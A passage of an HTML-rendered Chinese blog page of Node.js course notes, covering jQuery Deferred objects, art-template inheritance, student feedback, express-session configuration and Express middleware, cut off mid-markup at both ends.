p;            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runAsync().then(function(data)&#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们发现：</p><p>1、创建Deferred对象的时候没有传参；而创建Promise对象的时候，传了参数（传了一个匿名函数，函数也有两个参数：resolve、reject）；</p><p>2、Deferred对象直接调用了resolve方法；而Promise对象则是在内部调用的resolve方法；</p><p>说明：Deferred对象本身就有resolve方法，而Promise对象是在构造器中通过执行resolve方法，给Promise对象赋上了执行结果的状态。</p><p>这样就有一个弊端：因为Deferred对象自带resolve方法，拿到Deferred对象之后，就可以随时调用resolve方法，其状态可以进行手动干预了，这样不好</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> defer = $.Deferred();</span><br><span class="line">        <span class="comment">//做一些异步操作</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;执行完成&#x27;</span>);</span><br><span class="line">            defer.resolve(<span class="string">&#x27;异步请求成功之后返回的数据&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> defer;</span><br><span class="line">    &#125;</span><br><span class="line">　　 <span class="keyword">var</span> der = runAsync();</span><br><span class="line">　 　der.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">　 　&#125;);</span><br><span class="line"> 　　der.resolve(<span class="string">&#x27;在外部结束&#x27;</span>); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样的话就直接在外部直接给Deferred设置了状态，打印“在外部结束”，1s后打印“执行完成”，不会打印“异步请求成功之后返回的数据”了。</p><p>显然，这不好。我发个异步请求，还没收到数据就让人在外部给我结束了。。。。。。。</p><p>当然这个坑jQuery肯定会填的，在Deferred对象上有一个promise方法，是一个受限的Deferred对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> def = $.Deferred();</span><br><span class="line">        <span class="comment">//做一些异步操作</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;执行完成&#x27;</span>);</span><br><span class="line">            def.resolve(<span class="string">&#x27;请求成功之后返回的数据&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">return</span> def.promise(); <span class="comment">//就在这里调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>所谓受限的Deferred对象，就是没有resolve和reject方法的Deferred对象。这样就无法在外边改变Deferred对象的状态了。</p><p><strong>then方法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> def = $.Deferred();</span><br><span class="line">        <span class="comment">//做一些异步操作</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="keyword">var</span> num = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.random()*<span class="number">10</span>); <span class="comment">//生成1-10的随机数</span></span><br><span class="line">               <span class="keyword">if</span>(num&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">                   def.resolve(num);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span>&#123;</span><br><span class="line">                   def.reject(<span class="string">&#x27;数字太大了&#x27;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">return</span> def.promise(); <span class="comment">//就在这里调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runAsync().then(<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;resolve&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(d);</span><br><span class="line">    &#125;,<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;reject&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(d);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>done，fail语法糖</strong>,分别用来指定执行完成和执行失败的回调,与这段代码是等价的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> def = $.Deferred();</span><br><span class="line">        <span class="comment">//做一些异步操作</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="keyword">var</span> num = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.random()*<span class="number">10</span>); <span class="comment">//生成1-10的随机数</span></span><br><span class="line">               <span class="keyword">if</span>(num&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">                   def.resolve(num);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span>&#123;</span><br><span class="line">                   def.reject(<span class="string">&#x27;数字太大了&#x27;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">return</span> def.promise(); <span class="comment">//就在这里调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runAsync().done(<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;resolve&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(d);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;reject&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(d);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>always的用法</p><p>jquery的Deferred对象上还有一个always方法，不论执行完成还是执行失败，always都会执行，有点类似ajax中的complete。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">var</span> def = $.Deferred();</span><br><span class="line">       <span class="comment">//做一些异步操作</span></span><br><span class="line">       <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="keyword">var</span> num = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.random()*<span class="number">10</span>); <span class="comment">//生成1-10的随机数</span></span><br><span class="line">             def.resolve(num);   </span><br><span class="line">       &#125;, <span class="number">2000</span>);</span><br><span class="line">       <span class="keyword">return</span> def.promise(); <span class="comment">//就在这里调用</span></span><br><span class="line">   &#125;</span><br><span class="line">   $.when(runAsync(), runAsync(), runAsync()) .then(<span class="function"><span class="keyword">function</span>(<span class="params">data1, data2, data3</span>)</span>&#123;</span><br><span class="line">　　　　 <span class="built_in">console</span>.log(<span class="string">&#x27;全部执行完成&#x27;</span>);</span><br><span class="line">　　　　 <span class="built_in">console</span>.log(data1, data2, data3);</span><br><span class="line">　　&#125;);</span><br></pre></td></tr></table></figure><p>﻿# Node.js 第6天课堂笔记</p><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>多人社区案例</li></ul><h2 id="反馈-4"><a href="#反馈-4" class="headerlink" title="反馈"></a>反馈</h2><h2 id="复习-4"><a href="#复习-4" class="headerlink" title="复习"></a>复习</h2><ul><li>MongoDB 数据库<ul><li>灵活</li><li>不用设计数据表</li><li>业务的改动不需要关心数据表结构</li><li>DBA 架构师 级别的工程师都需要掌握这项技能<ul><li>设计</li><li>维护</li><li>分布式计算</li></ul></li></ul></li><li>mongoose<ul><li>mongodb 官方包也可以操作 MongoDB 数据库</li><li>第三方包：WordPress 项目开发团队</li><li>设计 Schema</li><li>发布 Model（得到模型构造函数）<ul><li>查询</li><li>增加</li><li>修改</li><li>删除</li></ul></li></ul></li><li>Promise<ul><li><a href="http://es6.ruanyifeng.com/#docs/promise">http://es6.ruanyifeng.com/#docs/promise</a></li><li>callback hell 回调地狱</li><li>回调函数中套了回调函数</li><li>Promise(EcmaScript 6 中新增了一个语法 API)</li><li>容器<ul><li>异步任务（pending）</li><li>resolve</li><li>reject</li></ul></li><li>then 方法获取容器的结果（成功的，失败的）</li><li>then 方法支持链式调用</li><li>可以在 then 方法中返回一个 promise 对象，然后在后面的 then 方法中获取上一个 then 返回的 promise 对象的状态结果</li></ul></li></ul><h2 id="上午总结-5"><a href="#上午总结-5" class="headerlink" title="上午总结"></a>上午总结</h2><h2 id="下午总结-4"><a href="#下午总结-4" class="headerlink" title="下午总结"></a>下午总结</h2><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li><p>path 模块</p><ul><li><p>path.parse</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path.parse(<span class="string">&#x27;C:\\path\\dir\\file.txt&#x27;</span>);</span><br><span class="line"><span class="comment">// 返回:</span></span><br><span class="line"><span class="comment">// &#123; root: &#x27;C:\\&#x27;,</span></span><br><span class="line"><span class="comment">//   dir: &#x27;C:\\path\\dir&#x27;,</span></span><br><span class="line"><span class="comment">//   base: &#x27;file.txt&#x27;,</span></span><br><span class="line"><span class="comment">//   ext: &#x27;.txt&#x27;,</span></span><br><span class="line"><span class="comment">//   name: &#x27;file&#x27; &#125;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>__dirname 和 __filename</p><ul><li><strong>动态的</strong> 获取当前文件或者文件所处目录的绝对路径</li><li>用来解决文件操作路劲的相对路径问题</li><li>因为在文件操作中，相对路径相对于执行 <code>node</code> 命令所处的目录</li><li>所以为了尽量避免这个问题，都建议文件操作的相对路劲都转为：<strong>动态的绝对路径</strong></li><li>方式：<code>path.join(__dirname, &#39;文件名&#39;)</code></li><li><code>__dirname</code>可以用来获取当前文件模块所属目录的绝对路径</li><li><code>__filename</code>可以用来获取当前文件的绝对路径</li></ul></li><li><p>art-template 模板引擎(include、block、extend)</p><ul><li><p>include</p><p>公共的头部，尾部</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;include <span class="string">&#x27;./header.art&#x27;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;include <span class="string">&#x27;./header.art&#x27;</span> data&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>extend</p><p>index.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;extend <span class="string">&#x27;./layout.html&#x27;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;block <span class="string">&#x27;content&#x27;</span>&#125;&#125;</span><br><span class="line">&lt;h1&gt;</span><br><span class="line">    填坑</span><br><span class="line">&lt;/h1&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">tianh</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">&#123;&#123;/block&#125;&#125;</span><br></pre></td></tr></table></figure><p>layout.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &#123;&#123; include &#x27;./header.html&#x27;&#125;&#125;</span><br><span class="line">    &lt;h1&gt;HELLO&#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &#123;&#123;block &#x27;content&#x27;&#125;&#125;</span><br><span class="line">    &lt;h1&gt;默认内容&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;默认内容&lt;/h2&gt;</span><br><span class="line">    &lt;h1&gt;默认内容&lt;/h1&gt;</span><br><span class="line">    &#123;&#123;/block&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>注意填坑不是按照layout.html写坑的顺序，而是按照index中extend的调用顺序，并且相同标签只能填一个坑</p></li><li><p>block</p></li></ul></li><li><p>表单同步提交和异步提交区别</p><ul><li>以前没有 ajax 都是这么干的，甚至有些直接就是渲染了提示信息出来了</li><li>异步提交页面不会刷新，交互方式更灵活</li></ul></li><li><p>Express 中配置使用 express-session 插件</p></li><li><p>概述案例中注册-登陆-退出的前后端交互实现流程</p></li></ul><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><h1 id="Node-js-第7天课堂笔记"><a href="#Node-js-第7天课堂笔记" class="headerlink" title="Node.js 第7天课堂笔记"></a>Node.js 第7天课堂笔记</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li>上午<ul><li>多人社区案例</li><li>Express 中间件</li></ul></li><li>下午<ul><li>Vue</li></ul></li></ul><hr><h2 id="反馈-5"><a href="#反馈-5" class="headerlink" title="反馈"></a>反馈</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">funtion extend (source, target) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    target[key] = source[key]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj2 就拥有了 obj1 的所有成员了</span></span><br><span class="line">extend(obj1, obj2)</span><br></pre></td></tr></table></figure><ul><li> 唉…………</li><li> 老师我想问下 那个操作文件路径不受打开命令执行node命令所属路径影响什么意思，是可以在任意窗口打开都可以访问到吗。。。。。</li><li> 慢点 心急吃不了热豆腐</li><li> 老师讲的很好 很清晰 希望老师下午第一节上课时间短点 第一节很困 上课时间太长听课效率有点低</li><li> 老师 写案例的时候 一个文件的代码量多了 可不可以把字体稍微调小点便于看全局结构 有时候感觉自己连不上</li><li>extend还不是很理解<ul><li>模板继承</li><li>extend 把复制过来</li><li>layout</li><li>index （extend layout）</li><li>index 就具有了 layout 的内容</li><li>index 还可以有自己的自定义内容</li></ul></li><li> 能不能把命令系统地罗列一下,@ 0 @</li><li> 听得时候都差不多听懂了，可是自己做的时候发现不知道从何入手，即使是看着老师的需求与代码，也根本不懂怎么写了，感觉自己听完了就全都忘光了，很郁闷！</li><li>我现在学习的感觉就像 你是个俄国人，教我了一句外语，你已经重复 了很多遍，我也努力再听，但是当你说完的那一刻，我就完全不知道你说了什么。就是仅仅过了一耳朵，再加上内容太多，我已经感觉完全跟不上了，怎么办，我有点崩溃。怎么破<ul><li>上帝撒了一把智慧，可惜我打了一把伞</li><li>多花时间、废寝忘食</li></ul></li><li>老师你是不是喜欢Anglebaby?我同桌问的，她是个女的<ul><li>Angelababy</li></ul></li><li>如何在浏览器中模拟所谓的art-template高级技术？关于浏览器操作cookie的插件如何使用，需要注意些什么？还可以安装一些什么谷歌浏览器插件，有助于提高开发效率或模拟项目、测试的实用插件！<ul><li>只是一个工具</li><li><a href="https://github.com/js-cookie/js-cookie">https://github.com/js-cookie/js-cookie</a></li><li>EditThisCookie Chrome 浏览器插件</li></ul></li><li>文件引入有规则吗，像router.js中，需要重新引入第三方模块express，但是body-parser在routre页面也使用了呀，但是怎么不用引入<ul><li> 这主要是中间件的原因</li></ul></li><li>req.session对象不清楚 希望老师再讲讲<ul><li>req.session.xxx = xxx</li><li>req.session.xxx</li><li>Session 是基于 Cookie 实现的</li></ul></li><li> session 那块还是不怎么明白</li><li> 课间下课尽量要准时，特别是上午第一节课比较困，听课效率低，反正下课次数固定，也不会让上课时间减少。 下午5点半增加上课时间多多益善</li><li> 思路有点乱，有些小地方不明确，总的来说练得太少</li><li>mongoose中的Schema用的不熟练<ul><li>多写写</li></ul></li><li>如果先启动node服务，再开启数据库，数据库服务开启了，但是数据库并没有连接，这样会出现所有的操作都会失效的情况，必须打开新的命令行使用mongo命令手动连接数据库 反过来，如果先开启数据库，再开启node服务，就不会出现这样的问题，因为user.js代码中mongoose.connect(‘mongodb://localhost/test’, { useMongoClient: true })自动连接了数据库，刚开始以为数据库竟然和node产生了依赖，原来并不是！ 希望老师控制每节课的上课时间，一节课集中精力的时间最多20分钟，接下来的20分钟基本只有一半的效率，后面的时间效率只会指数减小，所以希望老师能在45分钟左右就休息一次，也能提高效率； 老师讲的很细，很认真，也很负责，希望能在最后一个月的时间学好最重要的内容，就像你说的，因为刚好遇见你！<ul><li> 你说的对，加油。</li></ul></li><li> 一到数据库就蒙。数据库始终连接不上去。我觉得不知道我数据库都学了什么?_?</li><li> nice！</li></ul><hr><h2 id="复习-5"><a href="#复习-5" class="headerlink" title="复习"></a>复习</h2><ul><li>path 模块</li><li>__dirname 和 __filename<ul><li><strong>动态的</strong> 获取当前文件或者文件所处目录的绝对路径</li><li>用来解决文件操作路劲的相对路径问题</li><li>因为在文件操作中，相对路径相对于执行 <code>node</code> 命令所处的目录</li><li>所以为了尽量避免这个问题，都建议文件操作的相对路劲都转为：<strong>动态的绝对路径</strong></li><li>方式：<code>path.join(__dirname, &#39;文件名&#39;)</code></li></ul></li><li>art-template 模板引擎(include、block、extend)<ul><li>include</li><li>extend</li><li>block</li><li>动手写一写</li></ul></li><li>表单同步提交和异步提交区别<ul><li>字符串交互</li><li>请求（报文、具有一定格式的字符串）</li><li>HTTP 就是 Web 中的沟通语言</li><li>服务器响应（字符串）</li><li>01</li><li>服务器端重定向针对异步请求无效</li></ul></li></ul><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h4 id="session的简介"><a href="#session的简介" class="headerlink" title="session的简介"></a>session的简介</h4><p>session是另一中记录客户状态的机制，与cookie不同的是 session数据保存在服务器中，而不是保存在客户端浏览器中，。</p><h4 id="session的用途"><a href="#session的用途" class="headerlink" title="session的用途"></a>session的用途</h4><p>session运行在服务器端，当客户端第一次访问服务器时，可以将客户的登录信息保存在服务器端。</p><p>当用户访问站点的其他页面时，可以根据用户的登录状态做出相应的提示，身份验证拦截。</p><p>session可以和数据库结合做持久化操作，当服务器挂掉时，不会导致用户信息丢失。</p><h4 id="session的工作流程"><a href="#session的工作流程" class="headerlink" title="session的工作流程"></a>session的工作流程</h4><p>当客户端第一次请求服务器时，服务器会为每个客户端创建一个独享的session对象，用于跟踪用户的状态。<br>同时，为session对象分配一个唯一标识sessionId。<br>为了管理session对象，以sessionId为键，以session对象为值，封装成Map集合。<br>响应客户端时，将sessionId以cookie的形式发送给客户端，存放在客户端浏览器的缓存中。<br>当客户端再次请求服务器时，会将sessionId以cookie请求头的方式发送给服务器，服务器得到sessionId后，从Map集合中，得到session对象，从而跟踪状态。</p><p><img src="https://s2.loli.net/2022/01/11/ILGFCsPMVa7pOQT.png" alt="在这里插入图片描述"></p><h4 id="session的特点"><a href="#session的特点" class="headerlink" title="session的特点"></a>session的特点</h4><p>同源的页面之间可以共享session数据<br>浏览器关闭时，服务器中保存的session对象也会跟着销毁<br>在第一次调用request.getSession()方法时，创建出session，<br>超时：session超过一定时间（默认30分钟，这个时间可设置）没有人使用，则认为超时，干掉这个session。<br>自杀：也可以明确的调用session的invalidate()方法，手动的杀死session。<br>意外身亡：或者当服务器非正常关闭时，服务器中的session跟着消亡。</p><ul><li><p>Express 中配置使用 express-session 插件</p><ul><li>插件也是工具</li><li>你只需要明确你的目标就可以了</li><li>我们最终的目标就是使用 Session 来帮我们管理一些敏感信息数据状态，例如保存登陆状态</li><li>写 Session<ul><li>req.session.xxx = xx</li></ul></li><li>读 Session<ul><li>req.session.xxx</li></ul></li><li>删除 Session<ul><li>req.session.xxx = null</li><li>更严谨的做法是 <code>delete</code> 语法</li><li>delete req.session.xxx</li></ul></li></ul></li><li><p>概述案例中注册-登陆-退出的前后端交互实现流程</p></li><li><p>session配置项</p><p>1.安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express-session</span><br></pre></td></tr></table></figure><p>2.加载</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br></pre></td></tr></table></figure><p>3.使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置中间件</span></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="string">&#x27;keyboard cat&#x27;</span>,</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// cookie: &#123; secure: true &#125; // https 协议的请求才会传入 cookie </span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">req.session.userinfo = <span class="string">&#x27;zhangsan&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>secret</td><td>字符串，作为服务端生成session的签名</td></tr><tr><td>name</td><td>返回客户端的cookie的名称，默认为content.sid，也可以自己设置</td></tr><tr><td>resave</td><td>强制重新保存session，即使它没有变化，默认为true，建议设置成false</td></tr><tr><td>saveUninitialized</td><td>强制将未初始化的session存储，默认是true，建议设置成true,不管是不是用session都默认分配一把钥匙</td></tr><tr><td>cookie</td><td>关于cookie配置信息</td></tr><tr><td>rolling</td><td>在每次请求时强行设置cookie，这将重置cookie过期时间，默认值为false</td></tr></tbody></table><p>默认session数据是内存存储，服务器一旦重启就丢失，真正的生产环境是会把session持久化存储</p></li></ul><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><h4 id="中间件的本质及工作原理"><a href="#中间件的本质及工作原理" class="headerlink" title="中间件的本质及工作原理"></a>中间件的本质及工作原理</h4><h5 id="中间件其实就是一个函数"><a href="#中间件其实就是一个函数" class="headerlink" title="中间件其实就是一个函数"></a>中间件其实就是一个函数</h5><p>function(req,res,next){ req:请求对象 res：响应对象 next：下一个中间件 }</p><h5 id="Express如何使用中间件-三种方式"><a href="#Express如何使用中间件-三种方式" class="headerlink" title="Express如何使用中间件?:三种方式"></a>Express如何使用中间件?:三种方式</h5><p> app.use(‘pathname’,中间件) : </p><p> pathname不写: 任何请求路径都会执行这个中间件  </p><p>pathname写了：任何以pathname开头的请求路径都会执行这个中间件  </p><p>app.get(‘pathname’,中间件) : 请求路径为pathname的get请求会执行这个中间件  app.post(‘pathname’,中间件) : 请求路径为pathname的post请求会执行这个中间件</p><h5 id="中间件工作流程（Express处理网络请求流程）"><a href="#中间件工作流程（Express处理网络请求流程）" class="headerlink" title="中间件工作流程（Express处理网络请求流程）"></a>中间件工作流程（Express处理网络请求流程）</h5><p><img src="https://s2.loli.net/2022/01/11/oGH1d9FSavhnjcL.png" alt="在这里插入图片描述"></p><p> <code>a.从上往下依次匹配请求路径，如果匹配成功则执行该中间件  b.如果这个中间件中调用了：next() ，则会继续往下匹配  c.如果所有的中间件都无法匹配，则会自动进入一个兜底的中间件响应返回404 not found错误</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 